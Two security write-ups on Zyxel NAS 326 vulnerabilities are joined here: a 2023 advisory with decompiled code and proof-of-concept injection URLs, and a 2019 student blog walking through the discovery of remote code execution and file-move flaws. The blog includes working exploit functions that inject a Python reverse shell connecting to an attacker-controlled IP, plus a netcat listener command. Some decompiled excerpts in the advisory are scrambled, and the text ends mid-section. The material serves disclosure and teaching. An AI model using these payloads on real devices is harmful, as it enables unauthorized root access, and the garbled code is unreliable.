## Summary

Multiple post-auth blind OS command and Python code injection vulnerabilities exist in the web management interface of some Zyxel NAS versions. These vulnerabilities could allow authenticated attackers to execute arbitrary OS commands or Python code on an affected device remotely. Attackers could leverage these vulnerabilities to perform unauthorized actions in the context of the WSGI server process running as `root` or the web server running as `nobody`.

## Details

## CVE-2023-37927 - OS command injection vulnerability in `storage_cgi`

The specific flaw exists within the implementation of the OS command execution mechanism via the `execRoot_bg2(cmd)` function within the `tools.py` component of the web management interface. Attackers can use a specially crafted `cmd` string to break out of the original command call and execute arbitrary Python code or OS commands in the context of the WSGI server running as `root`.

Our proprietary PRISâ¢ firmware analysis engine flagged a command injection vulnerability in function `FUN_00010568()` within the `executer_su` binary in the `/usr/local/apache/web_framework/bin` directory, as shown on *Figure 1*. The `FUN_00010568()` function calls the `execv()` function with user-provided input without validating or sanitizing it, potentially meaning that attackers could provide input containing shell commands that the program will execute, resulting in arbitrary remote command execution. As the name of the binary suggests, the purpose of this tool is the execution of OS commands in the context of the `root` user.

[![Figure 1. Zero-day scan result indicating a command injection vulnerability](/uploads/Figure01_FUN_10568_aa1043896e.png)

Figure 1. Zero-day scan result indicating a command injection vulnerability](/uploads/Figure01_FUN_10568_aa1043896e.png)

Further analysis revealed that the `execRoot_bg2(cmd)` function within the `tools.py` file in the `/usr/local/apache/web_framework/lib` directory invokes the analyzed `executer_su` binary. The vulnerability exists because the `execRoot_bg2(cmd)` function calls `os.system()` with user-controlled input in the `cmd` parameter. This function is intended for executing a command (provided as a string) in a subshell. Incorporating user-supplied data into a command string that is passed as an argument to the `os.system()` function creates an opportunity for a command injection vulnerability. The following is the decompiled Python source code of the affected function:

```
def execRoot_bg2(cmd):
   exec_path = os.path.join(sub('/lib.*$', '', os.path.realpath(__file__)), 'bin/executer_su')
   os.system(exec_path + ' ' + cmd + ' &')

```

The affected `execRoot_bg2()` function is invoked by the `CGICreateLVOnDisk()` and `CGICreateMdVol_VG()` functions within the `storage_cgi.py` controller. The following is the decompiled Python source code of the mentioned handler functions, showing the command strings created with the old-style string formatting operator `%`.

```
def CGICreateMdVol_VG(cherrypy, arguments):
    auth_status = authentication(arguments)
    if auth_status != AUTH_PASS:
        return gui_errmsg(auth_status)

        if arguments.has_key('raidName') and arguments.has_key('raidLevel') and
          arguments.has_key('volType') and arguments.has_key('diskxList'):
            if type(arguments['diskxList']) != list:

                        info = f.read().strip()
                    if info == '':
                        sleep(0.5)

            return storage_main.GUI_ERRMSG_ARG
        return storage_main.GUI_ERRMSG_ARG

                arguments['diskxList'] = [
                 arguments['diskxList']]
            sec = 0
            while path.exists(storage_main.CREATE_VG_LCK) and sec <= 5:
                sleep(1)
                sec = sec + 1
            if sec > 5:
                storage_main.StoDebug('Error(can not enter critical): file=' + storage_main.CREATE_VG_LCK)
                return storage_main.GUI_ERRMSG_UNEXPECTED
            cmd = '%s -c \'from models import storage_main; storage_main.MainCreateLVOnDisk("%s", "%s", "%s", "%s", %s)\'' % (storage_main.PYTHON, arguments['volName'], arguments['volSiz'], arguments['raidName'], arguments['raidLevel'], json.dumps(arguments['diskxList']))
            storage_main.StoDebug(cmd)
            execRoot_bg2(cmd)
            sleep(0.5)
            for i in range(10):
                if path.exists(storage_main.CREATE_VG_LCK):
                    with open(storage_main.CREATE_VG_LCK) as (f):
                        info = f.read().strip()
                    if info == '':

                    sleep(0.5)
            storage_main.StoDebug('error, cgi time out')
            return storage_main.GUI_ERRMSG_ARG
        return storage_main.GUI_ERRMSG_ARG

```

The `CGICreateLVOnDisk()` and `CGICreateMdVol_VG()` functions turned out to be the API handlers of the `createDiskGroupVolume` and `createRaidOrDiskGroup` commands available through the web management interface after authentication. The following is the relevant excerpt of the `/usr/local/apache/htdocs/desktop,/utility/command.js` file that maps commands to their API endpoints.

```
var cmdPool = {
...SNIP...
createRaidOrDiskGroup:'/cmd,/ck6fup6/storage_cgi/CGICreateMdVol_VG',
createDiskGroupVolume:'/cmd,/ck6fup6/storage_cgi/CGICreateLVOnDisk',
...SNIP...
}

```

The `raidName`, `raidLevel`, `volType` and `diskxList` parameters at `/cmd,/ck6fup6/storage_cgi/CGICreateMdVol_VG` appear to be vulnerable to Python code injection or OS command injection attacks. Attackers could use the double quote ( `"` ) character to inject arbitrary Python statements or the single quote ( `'` ) character to break out of the original Python command and inject arbitrary OS commands.

The vulnerability in the `CGICreateMdVol_VG()` handler can be confirmed with an authenticated user via the following URLs:

```
http[:]//NAS326/cmd,/ck6fup6/storage_cgi/CGICreateMdVol_VG?whoami=admin&raidName=1%22%2C__import__(%22os%22).system(%22id%3E%2Ftmp%2Fbugproved%22)%2C%22&raidLevel=2&volType=3&diskxList=4
http[:]//NAS326/cmd,/ck6fup6/storage_cgi/CGICreateMdVol_VG?whoami=admin&raidName=1%22)%27%3Bid%3E%2Ftmp%2Fbugproved%3B%27(%22&raidLevel=2&volType=3&diskxList=4

```

We submitted the payloads `1",__import__("os").system("id>/tmp/bugproved"),"` and `1")';id>/tmp/bugproved;'("` in the `raidName` parameter. The application created the `/tmp/bugproved` file, containing the output from the injected command, indicating that the Python code was interpreted and the OS command was executed.

Conveniently, the command string passed to the `execRoot_bg2()` function is logged in the `/tmp/sto_log` file. *Figure 2.* shows the log content with the PoC payloads and the output of the executed commands.

Figure 2. Injecting code into the createRaidOrDiskGroup command](/uploads/Figure02_Main_Create_Md_Vol_VG_90d00c4fd6.png)

Furthermore, the `volName`, `volSize`, `raidName`, `raidLevel` and `diskxList` parameters at `/cmd,/ck6fup6/storage_cgi/CGICreateLVOnDisk` are also affected. We can observe the same results by submitting the same payloads in the `volName` parameter. *Figure 3.* shows the log content with the payloads and the output of the executed commands.

```

```
## CVE-2023-37928 - Python code injection vulnerability in `simZysh`

This issue seems to result from an incomplete fix for CVE-2023-27992, which appears to be a duplicate of CVE-2019-10633 originally reported by Max Dulin. We independently reported this vulnerability to Zyxel before we became aware of Maxâs research.

Similarly to the mentioned vulnerabilities, the specific flaw exists within the implementation of the MVC model in the `simZysh()` function of the `main_wsgi.py` component of the web management interface. Attackers can use specially crafted values in multiple path query parameters to execute arbitrary Python code in the context of the web server process running as `nobody`.

The `c%d` query parameters used at path `/cmd,/simZysh` appear to be vulnerable to Python code injection attacks. The purpose of this function is to simulate `zyshcgi`'s output. The function expects commands in the format `controller action {"arg1": value, "arg2": value, ...}`. We submitted the payload `system_main whoami {__import__("os").system("id>/tmp/bugproved")}` in the `c0` request parameter, as *Figure 4.* shows.

[![Figure 4. Python code injection vulnerability in the c0 parameter](/uploads/Figure04_sim_Zysh_1_00e0ecd571.png)

Figure 4. Python code injection vulnerability in the c0 parameter](/uploads/Figure04_sim_Zysh_1_00e0ecd571.png)

The application does not seem to return the command output in its responses. However, we can find the output of the injected `id` command in the file `bugproved` created in the `/tmp` directory, as *Figure 5.* shows.

[![Figure 5. Output of the injected id command](/uploads/Figure05_sim_Zysh_2_5cbbfa245c.png)

Figure 5. Output of the injected id command](/uploads/Figure05_sim_Zysh_2_5cbbfa245c.png)

The path `/cmd,` is just an alias to a WSGI application. Hence, requests made for `http://NAS326/cmd,` causes the web server to run the WSGI application defined in the `main.wsgi` file in the `/usr/local/apache/web_framework` directory. The following is the relevant excerpt of the `httpd_special.conf` file in the `/etc/service_conf` directory:

```
<Directory /usr/local/apache/web_framework>
  Order allow,deny
  Allow from all
</Directory>

WSGIScriptAlias /cmd, /usr/local/apache/web_framework/main.wsgi

...SNIP...

```

The web application redirects requests from `/ck6fup6` and `/tjp6jp6y4` to the WSGI server listening on the socket `/tmp/main_wsgi.sock` to `/ck6fup6_to_wsgi_server` and `/tjp6jp6y4_to_wsgi_server` following the `/<controller>/<action>` pattern. The below is the decompiled Python source code of the discussed request handler functions from the `main.wsgi` file:

```
def ck6fup6(self, *url_args, **request_args):
...SNIP...
       url = tools_cherrypy.SOCKET_URL_PREFIX + '/ck6fup6_to_wsgi_server/%s/%s' % (url_args[0], url_args[1])
       response = tools_cherrypy.socket_request(url, data=request_args, cookies=self.set_cookies())
       if response == tools_cherrypy.INT_SERV_ERROR:
           return tools_cherrypy.gui_errmsg(response)
       return response.json()

def tjp6jp6y4(self, *url_args, **request_args):
...SNIP...
       if url_args[0] == 'register_main' and url_args[1] == 'setCookie':
...SNIO...
       else:
           url = tools_cherrypy.SOCKET_URL_PREFIX + '/tjp6jp6y4_to_wsgi_server/%s/%s' % (url_args[0], url_args[1])
           response = tools_cherrypy.socket_request(url, data=request_args, cookies=self.set_cookies())
           if response == tools_cherrypy.INT_SERV_ERROR:
               return response
           return response.content
       return

```

In this case, requests are processed in the `simZysh()` handler function that will load the requested controller scripts and execute the specified functions via `eval()`. Be aware that the WSGI server runs in a separate process from the web server. Hence, the injected code will be executed in the context of the WSGI server process. The following is the relevant excerpt of the decompiled Python source code of the mentioned request handler function:

```
def simZysh(self, *url_args, **request_args):
    r_value = {}
    c_index = 0
    while True:
        c_key = 'c%d' % c_index
        if request_args.has_key(c_key):
            controller_n, action_n, args = request_args[c_key].split(' ', 2)
            try:
                controller = __import__('controllers.%s' % controller_n)
                tmp_result = eval('controller.%s.%s(cherrypy=%s, arguments=%s)' % (controller_n, action_n, 'cherrypy', args))
...SNIP...
            except:
...SNIP...
        else:
            break
        c_index += 1
    return r_value

```

Further analysis confirmed that the vulnerability lies again within the implementation of the MVC model. The web application uses the `eval()` function to load controllers and perform actions based on the `/<controller>/<action>` path segments. The evaluated Python expression is specified in the string pattern `controller.%s.%s(cherrypy=%s, arguments=%s)` and formatted based on user-supplied input.

Python code injection vulnerabilities arise when the application incorporates user-controllable data into a string dynamically evaluated by a code interpreter, in this case via the `eval()` function. If the user input is not strictly validated, attackers can use specially crafted input to modify the original code to be executed and inject arbitrary code that the server will run.

The vulnerability can be confirmed with an authenticated user via the following URL:

```
http[:]//NAS326/cmd,/simZysh?c0=system_main%20whoami%20{__import__(%22os%22).system(%22id%3E%2ftmp%2fbugproved%22)}

```

# Discovering 0-Days in Zyxel NAS 326

4/4/2019

This article is divided into two main parts:

1. **Initial research into how the device works**. This is wonderful for people new to the hacking space; it gives a good glimpse at how to do research. Although I am also quite new to the field, I thought it would be helpful to share my step-by-step process for understanding how the device works.
2. **Vulnerability disclosures** (CVE's). I give a step-by-step process of how I found each vulnerability, as well as a proof-of-concept exploit. Below is a list of CVE's to view:
   * [CVE-2019-10633](#CVE-2019-10633): Remote Code Execution (RCE) via the Web Server Routing
   * [CVE-2019-10631](#CVE-2019-10631): RCE via Package Installer
   * [CVE-2019-10632](#CVE-2019-10632): Arbitrary File-Share Moving
   * [CVE-2019-10634](#CVE-2019-10634): Cross Site Scripting (XSS) in Description Fields
   * [CVE-2019-10630](#CVE-2019-10630): Plaintext Admin Password

## Starting Out

Research into the security of an application or device can be quite scary to take on, especially if you are new to the entire process. In fact, research can be quite gruesome and difficult, considering you are looking for a *flaw* into the security of something. In this article, I will outline my research into the *Zyxel NAS 326* with a step-by-step walk-through of my eventual exploitation.

### Don't Be Scared...I was Only a Rookie

I am currently a senior student at Gonzaga University, getting ready to graduate with a degree in Computer Science. With no real industry experience (just playing CTF's, reading blog posts and watching livestreams) for my *hacking* career. So, this article will be oriented to helping people new to the field (such as myself) get into the actual hacking of applications and devices. I am not an expert in this; but, the fact that I found several **0-days** in this NAS should demonstrate I have something to offer.

### Previous Knowledge

After I decided what I wanted to break Zyxel's NAS 326, it was time to learn from the others before me. The common phrase is *"We stand on the shoulders of giants"*, which is so true. Nothing in this article is groundbreaking or new information; it is all strategies and thoughts that I have seen previously in other blogs and videos. The lesson to take away from this is to do your due diligence into the particular space you are trying to hack.

The previous research that I built my work off of was mainly articles from [r/netsec](https:///reddit.com/r/netsec). However, I will not be mentioning this (because there would be too much to talk about). Instead, I will bring up the research from the [Independent Security Evaluators](https://www.securityevaluators.com/) (ISE). ISE has done a significant amount of research into the hacking of Internet of Things (IoT) devices, with campaigns such as SOHOpeless Broken I and II, where they broke over 20 home office routers. In addition, they have done an immense amount of research into the security of NAS devices and run the IoT village at DEFCON. The real kicker though, were their livestreams! These livestreams showed step-by-step how they systematically broke the devices, with the added ability to ask questions. From these livestreams, I was able to develop a good methodology on how to break my NAS, as well as understand common issues associated with these devices, such as remote code execution via unvalidated input, file traversal issues, XSS and more. Again folks, do your homework; it will allow you to understand which direction to go.

## Understanding the Device

Trying to break something without having any idea how it works is nearly impossible. To understand the attack vectors, you need to know how the application works. So, I clicked in every nook and cranny on the site; mainly, I just tried to understand what was on the web application. Here are my **exact** notes for mapping the functionality of the application in Notepad++.
```

```
These notes proved useful throughout the entire assessment of the NAS.

### Grabbing the Source Code

After mapping the web application, I wanted to understand how the web application itself worked. I wanted to learn what technologies were being used, where it was located... Just understand the web application like a developer of it would. So, I enabled the SSH login to log onto the NAS. My goal was to find the web application, as well as any other interesting files. After *grepping* (a Linux terminal string search) for '*apache*' I found the web application in `/ram_bin/usr/local/apache`.

At this point, I did not want to run around the command line anymore with a limited set of tools (this booted into [BusyBox](https://busybox.net/about.html)). Hence, I moved all of the files within the directory onto my local machine for further analysis.

### Full Recovery of Source Code

Within the web\_framework folder, I noticed files with the ***.pyc*** extension. To those you do not know, this is a Python file, but compiled (hence the **PY**thon and **C**ompiled for the pyc). From watching the ISE livestreams I knew that the tool **uncompyle6** would allow me to recover the Python source code (even with comments)! After writing [this script](https://github.com/mdulin2/convert_uncompyle6), I had all of the source code for the *web\_framework* folder!

### Mapping Functionality

Within the Apache folder, the directory structure looked like this:
```

- apache
	- cgi-bin
	- htdocs
		- desktop,
		- playzone,
	- web_framework
		- controllers
		- views
		- models
	- modules

```
I dove into what all of these folders were being used for:

* **cgi-bin:** CGI (after googling) stands for **command gateway interface**. A CGI offers a standard protocol for web servers to run programs that execute like console applications but as a web API. Upon looking further at the files, I noticed they were compiled C executables, which meant I would have to reverse engineer them by reading assembly for further analysis.
* **htdocs**: The folder held the frontend views for the application, using a combination of HTML, CSS, JavaScript and a common library known as JQuery. The *desktop,* and *playzone,* folders were the logical separation of the web applications main components.
* **web\_framework**: From prior knowledge from my software development background, I knew that models, views and controllers resembled the common MVC (model view controller) design pattern.
* **modules**: The modules were libraries made for the *cgi-bin* and *web\_framework* API's to use. I knew these were libraries by the *.so* extension on the files.

### What is Important?

Once the application was mapped, I wanted to understand where the **important functionality** lived at. For this, I opened up my free version of **Burp Suite**. Burp Suite allows a user to intercept requests to view, tamper, repeat... Pretty much do anything with an incoming request. I noticed that almost all requests were being made to *'cmd,/tjp6jp6y4'* and *'cmd,/ck6fup6'*. After doing another grep within the apache directory I found the strings within the `/web_framework/main.wsgi` file. The only other piece of interesting information that I saw in Burp was that the authentication used a *cgi-bin* request. From here on out, the research will focus on the API calls within the web\_framework directory. There is a significant amount of research that could be done in the cgi-bin and module libraries. However, I choose to take the web\_framework path for simplicity sake.

### How Does Web\_framework Work?

In this next portion of the information gathering, I wanted to understand which web framework was used, which HTTP server, how the routes were being passed around and how authentication was done... I just wanted to understand how the API worked. The first thing I did was find the entry point, conveniently location in *main\_wsgi.py*.

Each of these bullet points will refer to a point made above. I would like to point out that I was looking for all of the bullet points **in general**, not getting bogged down on one item. This was a very general search with a few goals in mind.

* **Framework**: Within the main\_wsgi.py file I saw an import for a package named *Cherrypy*. Being curious about the package I googled what CherryPy was, with the results of it being a *Minimalist Python Web Framework*.
* **HTTP Server**: The file I was currently in had multiple occurrences of '*wsgi*' within the function names. Casually, I googled WSGI to find out what the acronym stood for. It turns out that it is *Web Server Gateway Interface*.
* **Routes**: After using Burp Suite I noticed two main strings at the beginning of the REST API calls - *ck6fup6* and *tjp6jp6y4*. Then, within the main\_wsgi.py file, were functions with these **exact** names! After reading some CherryPy documentation I discovered that these functions (plus simZysh) were the ways of entering the API's.

  Furthermore, as previously stated, the API's followed a model, view and controller ([MVC](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller)) design pattern. The API's always followed the pattern `{tjp6jp6y4 or ck6fup6}/controller_name/function_name`. I discovered this by searching for the API call strings within the web\_framework directory. This step of understanding **how** the API works will prove useful later on.
* **Authentication and Authorization**: Authentication (logging in) was mainly handled by one of the *cgi-bin files*. I discovered this by reading requests in Burp Suite. The authorization, on the other hand, was not as easy to understand. First, the API's would only work if the user was authenticated. However, I could not find the code that actually did this!

  After reading the source code and CherryPy docs for several hours, I finally realized that the CherryPy toolkit allows developers to have '*middleware*' functions that provide a plethora of added functionality. The developers of the NAS had added a middleware (interceptor) function at the beginning of each API call for the authorization piece. Got it! This middleware function (named `uam_update_callback`, which stands for universal authentication manager) then goes through a CRAZY amount of indirection to eventually call a C library called *utilities.so*.

## Vulnerabilities

### Importance of Reconnaissance

You are probably thinking *Man, that was a lot of reconnaissance but not much hacking?'* However, without this in-depth knowledge of how the application worked there is no way that I would have found vulnerabilities in the device. The first step to hacking is **understanding your target**. Hacking is simply understanding *how* the application works, then manipulating the current functionality to do something malicious. The reconnaissance is the most important part of the process.

### Attack Vectors

After all of the steps above, I like to make a list of potential issues that the application may be vulnerable to. I knew these from prior knowledge of reading and the ISE livestreams for similar devices.

* **Remote Code Execution**: The goal of any attack is to be able to run arbitrary code on the box. In this particular case, I had a feeling that the input validation was likely quite poor, as seen by the previous research on the [Zyxel NAS 325](https://blog.securityevaluators.com/ise-labs-finds-vulnerabilities-in-zyxel-nsa325-945481a699b8). So, checking the input validation to commands being executed on the OS would be a solid attack vector.
* **File/Directory Traversal**: Iterating up directory structures to access files/folders that should not be accessible. Anytime files are being managed, there is a chance that the input is not validated properly.
* **Cross Site Scripting(XSS)**: Anytime users are giving input that is eventually displayed back to the user in some way, I always search for XSS bugs (depending on the web framework).
* **Poor Authorization**: With this many API's I figured that at least one request would not be locked down correctly.
* **Cross Site Request Forgery(CSRF)**: Explained [here](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29), a large portion professional developers do not know what CSRF is. So, I always check for this issue.

These are the main vulnerabilities that I kept in the back of my head as I tested the application. But, keeping the mind open to other issues was also crucial. Just always have the evil bit flipped.

## CVE-2019-10633: Eval Injection via the Web Server Routing

As mentioned previously, the *web\_framework* API routes were using the MVC model. However, this was done in a very strange way. The route *controller\_name* references a file within the controller directory; the *function\_name* references a function within that file. Because of the strange nature of MVC implementation, these two lines within the *main\_wsgi.py* seriously caught my eye:

| ``` 1 2 3 ``` | ``` controller = __import__('controllers.%s' % url_args[0]) return eval('controller.%s.%s(cherrypy=%s, arguments=%s)' % (          url_args[0], url_args[1], 'cherrypy', 'request_args'))  ``` |
| --- | --- |

Initially, I attempted to exploit the Python native imports being used. I attempted to traverse back into the models directory and other files to make something malicious happen. This led me down a rabbit hole of trying to understand how Python deals with imports at a low level. However, the Python imports are implemented in a very secure and safe way. So, this was a dead end.

Then I noticed the **eval** function that was being used to interpret the imported Python code. Anytime user controllable input is being passed into a function that interprets native code, you are likely to find an RCE.

### Python Imports

My first question was *'how do Python imports work?'* At the interpreted level, what is actually happening? When a package or function is imported, it is accessible to all components of the file. A post that helped me was [here](https://stackoverflow.com/questions/15280157/what-happens-when-you-import-a-package). Once I understood that the functions of a package were accessible in the file, the evil bit flipped...1011**1**

### Initial Findings

If the *import* statement adds the functions to the file, then can I call those functions from this API? At this point, I was looking for something that could cause serious damage, such as **os**, **process** or a custom Zyxel function.
After searching through the source code I noticed that the *BackupPlanner\_main* controller had imported the *os* package (without even using it). I sent a request to `/cmd,/tjp6jp6y4/BackupPlanner_main/os.geteuid()/` just to see if I could call something. However, this returned *'int'* is not callable? I then tried another function that returned a string to get a similar error...
![Mad-Hatters-Team-Photo](https://farm8.staticflickr.com/7801/33647004008_0620b21c1e_c.jpg)Routing Error Message
What was going on? Then, it hit me! The *geteuid* function had executed, but had returned an **int**! Sure enough, when I checked the documentation, *geteuid()* returns as an integer!

At this point, I thought I had remote code execution, but wanted to **see** it. Within the *os* package is a function called *system* that allows for bash commands to be ran on the machine. The issue was the error message only showed me an output type (not the result). Because I could not see the output, I wanted to run a bash command that would stay persistent on the machine or freeze the NAS up. The first command that came to mind was the *yes* command. All this command does is continually print 'yes' until it is stopped (making it a wonderful choice because of the persistence). Once I sent `/cmd,/tjp6jp6y4/BackupPlanner_main/os.system('yes')` I was able to see the 'yes' command within the running processes when logged onto the NAS (I just used ps -A to see the process)! At this point, I knew I had RCE but just had to write a dangerous exploit.

### My First Backdoor

ISE usually ended their livestreams by inserting a [reverse shell](https://hackernoon.com/reverse-shell-cf154dfee6bd) onto the device. So, I decided to do the same using a very widespread Python backdoor using the *os.system* command. The only issue that I ran into was that the import statements could not use the '/' character. Because of this, I had to hex encode the '/' character to be able to use it within the backdoor payload. Once I got over this road block, the exploit was ready!

I setup a [netcat](https://en.wikipedia.org/wiki/Netcat) (often called the Swiss Army Knife of networking) listener on a server I controlled. After the listener was setup, I executed my payload to get the backdoor! Here's a video of the exploitation:

Although I choose to use the Python built in *os* package to exploit this, this API was vulnerable in countless ways. Besides calling the *os* and *process* packages it was possible to call malicious functions from the **models** or other packages written by the people at Zyxel. Using *os.system* just felt like the easiest way.

### Exploit Code

Two things should be noted:

1. The Python code after the os.system had to be URL encoded. That's what the encode\_characters function is for.
2. The original exploit I wrote was using the *Burp Repeater* functionality. I just altered the original request until the backdoor eventually worked. I wrote up this exploit a few days later.

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 ``` | ``` ''' Args:  	token: the auth token needed for the request  	location: The domain name for the URL to call. 	backdoor_ip: The backdoor's location  	port: The port of the backdoor server being used.  ''' def python_routing(location, token, backdoor_ip, port): 	# Given that backdoor_ip is listening on the port variable with netcat, this backdoors works, with a valid cookie. To replicate this, use the payload below with a netcat listener on backdoor_ip on port.  	# To setup the listener, use nc -lvp 'port' on your server.  	URL = "/cmd,/tjp6jp6y4/BackupPlanner_main/os.system(" + encode_characters("\"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"\\x2Fbin\\x2Fsh\",\"-i\"]);' &\"\"\"".format(backdoor_ip, str(port))) + ')'  	cookies = {'authtok': cookie} 	r = requests.get(url=location+URL, cookies = cookies) 	print "Backdoor created..."   ``` |
| --- | --- |

### Mitigations

At this point, rewriting the functionality for the API routes to not use the **eval** function would be quite difficult and timing consuming. Because of this, I recommended to Zyxel to create a **whitelist** of the intended and safe functions for the API. That way, the functionality would not change and it would fix the security issues.

## CVE-2019-10631: RCE via Package Installer

After finding a really bizarre RCE, I was hunting for another one! My next thoughts: Within the ISE livestreams I noticed that several of the RCE's that they discovered came from poorly validated input being passed into shell scripts. So, I started hunting for potentially malicious functions that communicated directly with the command line.

### Initial Searching

**Grep** is a wonderful tool that allows you to search for strings within a directory. I abuse this command when attempting to find malicious looking functions. At first, I searched for *os.system* using grep, but came up with too many results. With so many red herrings (false leads) because of static strings being used as input, this was still somewhat slow. I found several good leads, but all of them had input that was validated quite well (such as usernames, passwords and other normal input). The other rabbit hole that I went down was that a large amount of the code base was **dead**, meaning that it was not being used. I only figured this out after finding several great leads, but not finding any place it was being called at in the controllers. \*\*Sigh\*\* Finally, I decided to grep for '**execute**'. One line in a seldomly used file that particularly caught my eye was `def execute_script(exepath, content=False):`. I verified that this function was passing input without validating it; but, had to find a way to use it!

### Indirection Is Bliss

To me, the cause of vulnerabilities falls into two main categories: *ignorance* or *obliviousness*. The first vulnerability fell into the first category (as they did not know the mistakes that they were making). However, with professional developers *ignorance* is not as common. From my experiences, the *obliviousness* comes from a lack of understanding of how the system works as a whole. An issue may be obvious coming from one direction but impossible to see if the functionality has been abstracted away. One major way that a lack of understanding can be found is in **indirection**. To a developer, the tools that their co-workers have created can be used freely, partially because they have made a poor assumption about a safe and secure implementation without doing any further review. This indirection causes many issues because no developer has the time to fully understand the entire environment.

### Chain of Functions

The flow went like this: `portal_main.py -> pkg_init_cmd -> Portal_PKG.py -> portal_pkg_init_cmd -> execute_script`. Because of all the indirection, this function was used by the developer without even knowing that the function did not validate the input for malicious commands. This was found just by tracing the functions back to their respective files until I found an easy entry point.

### Understanding the Route

Once again, understanding how the functionality works is the most important thing. After finding a place where the request was used on the frontend, I viewed the request in Burp Suite to see that only two parameters were being passed in: *pkgname* and *cmd*. After reading the source code it was clear that the *pkgname* had to be a valid package. However, the *cmd* parameter had no special needs for it. So, this parameter was the easy choice for the command injection.
### Exploitation

As before, I wanted to verify that I had a command injection within the package installer. From watching the ISE videos, I remembered that they commonly used the  [backtick (`)](https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands) characters to execute bash commands in unattended ways. So, I threw in a ``yes`` into the *cmd* parameter. Once again, I could see under the running processes a new **yes**!

After verifying the `yes` worked properly, I inserted the same Python based backdoor as talked about in the RCE above. Then, out popped a backdoor :)

### Final Thoughts on this RCE

When one vulnerability is prevalent, it is likely to be a **repeated issue**. If you are looking to dive deeper, start looking for repeat offenders. In this case, the package installer had many other vulnerable areas that were susceptible to command injection. However, I got bored of finding these similar RCE's. So, I decided to pursue other fun paths of exploitation.

### Source Code

The exploit payload is almost identical from the previous find besides that the payload includes a pair *backticks (`)* to allow for the malicious payload to be ran.

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 ``` | ``` ''' Args:  	token: the auth token needed for the request  	location: The domain name for the URL to call. 	backdoor_ip: The backdoor's location  	port: The port of the server being used.  ''' def package_manager(location, token, backdoor_ip, port): 	# Given that backdoor_ip is listening on the port variable with netcat, this backdoors works, with a valid cookie. To replicate this, use the payload below with a netcat listener on backdoor_ip on port.  	# To setup the listener, use nc -lvp 'port' on your server.   	URL= "/cmd,/tjp6jp6y4/portal_main/pkg_init_cmd?pkgname=myZyXELcloud-Agent&cmd=" + encode_characters("""`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\x2Fbin\x2Fsh","-i"]);'` &""".format(backdoor_ip,port))  	 	cookies = {'authtok': cookie} 	r = requests.get(url=location+URL, cookies = cookies) 	print "Backdoor created..."  ``` |
| --- | --- |

### Mitigations

Simply put, just do more input validation when the values are coming in. If shell meta-characters were being looked for, this exploit would have been significantly harder (if not impossible).

## CVE-2019-10632: Arbitrary File-Share Moving

The main purpose of a NAS (network attached storage) device is to be able to store files as backup, but still have the ability to access them remotely. This vulnerability is about moving files between different *shares* or folders that only specific users have access to.

### Understanding How Files are Stored

The file storage was implemented just as in any normal file system: using directories and files. Except, the files were viewable via the web application. I discovered how the NAS stored the data by reading the source code and reading through the file system itself on the NAS.

With the proper permissions, users have access to specific *shares*. The admin user sets who can view what shares.

### Initial Ideas

For file management, two very common issues come to mind: directory traversal and XSS. I will talk about both of these paths...

The first path I went down involved directory traversal. I was curious to see if I could access files maliciously (such as /etc/shadow) or if I could create files in interesting locations. However, my initial attempt of this fell short... The developers had created a special function called `is_path_in_share` that validated the users were **only** accessing data in the specified share. Secondly, they had a function to ensure that the share being accessed was allowed by the current user. So, this path was secured quite well.

The XSS had a promising path (as file names were not being validated for malicious input). I attempted to create a stored XSS attack upon the loading of a file name. However, in this scenario, I found it practically impossible to create a viable payload for this. Although most characters can be in a file name in Linux (yes, even \*,\ and <), the '/' character cannot! Because of this, any tag that I tried to insert for a XSS payload would not work because I could not close the tag.

### Reading the Source

The leads above ended up being dead-ends. So, I decided to take a closer look at the source code to understand how files were being managed. After about a half an hour of reading the source code of the *fileBrowser\_main.py* file I noticed an unused function:
`non_job_queue_operation`. Initially, I did not think very much of it because of the limited functionality of it. However, most of the previous security checks that prevented the directory traversal were not being used in this function! This opened an opportunity for exploitation.

### Reverse Engineering the API

Because the API was not being used anywhere on the frontend, I had to manually figure out how to use the API. The code for the function can be seen below:

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 ``` | ``` def non_job_queue_operation(cherrypy, arguments):     """ file operation and pass around the job_queue     arguments:             action(required): action of file operation                   """     .....     if arguments['action'] == 'create': 		.....     else:         if arguments['action'] == 'rename':             if not (arguments.has_key('share') and arguments.has_key('path') and arguments.has_key('target_path') and arguments.has_key('username')):                 return {'errorMsg': _('Argument Error')}             ret = model.rename_item_by_share(arguments['share'], arguments['path'], arguments['target_path'], arguments['username'])             return_data = {'errmsg0': ret} 		....     return view.collect_errmsg(return_data)  ``` |
| --- | --- |

The first interesting part of the function was that there were two options (labeled as 'action'): *create* and *rename*. I found the idea of creating a blank folder to be pretty useless. So, I moved onto the *rename* functionality. I thought that by renaming a file/folder it may be possible to traverse up directories to gain the ability read or write to files arbitrarily. This ended up being a worth-while attack vector.

Within the *rename* functionality were four required parameters: share, path, target\_path and username. I knew this by the `if not (arguments.has_key('share') and arguments.has_key('path') and arguments.has_key('target_path') and arguments.has_key('username')`. This line made it quite obvious that these parameters were required, otherwise the function would result in an error message. Now, after all of the parameters were passed in correctly, a function to actually rename the file was called in one of the models.

